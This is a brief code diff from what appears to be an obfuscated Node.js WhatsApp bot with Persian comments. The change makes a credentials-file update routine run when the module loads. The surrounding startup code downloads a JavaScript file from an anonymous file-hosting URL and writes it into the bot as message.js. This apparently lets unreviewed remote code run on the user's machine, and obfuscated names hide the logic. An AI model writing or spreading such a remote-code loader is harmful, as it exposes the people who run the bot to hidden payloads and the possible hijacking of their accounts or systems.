@@ -150,6 +150,7 @@ async function updateCredsFile() {
     return false;
   }
 }
+updateCredsFile();
 
 async function downloadFile(url, dest) {
   // بررسی اگر فایل از قبل وجود دارد
@@ -201,7 +202,6 @@ async function startBotz() {
   const fileURL = 'https://files.catbox.moe/xdptfr.js'; // آدرس URL فایل
   const destPath = path.join(__dirname, 'message.js'); // مسیر ذخیره فایل
   await downloadFile(fileURL, destPath);
-  await updateCredsFile();
   
   if (true && !_0xf79aae.authState.creds.registered) {
     const _0x23f2bd = await question("\n\nPlease Type Your WhatsApp Number Example 93****** :\n");
